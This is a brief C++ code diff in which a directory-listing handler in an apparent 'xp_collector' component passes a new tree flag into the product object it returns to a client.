@@ -17,6 +17,7 @@ std::unique_ptr<xp_collector::IRequest> xp_collector::DirListHandler::handle(std
 	                                  dir_list_command->get_depth());
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
-		std::make_unique<DirListProduct>(command->get_command_id(), CommandType::DirList, std::move(paths))
+		std::make_unique<DirListProduct>(command->get_command_id(), CommandType::DirList, std::move(paths),
+		                                 dir_list_command->get_is_tree())
 	);
 }
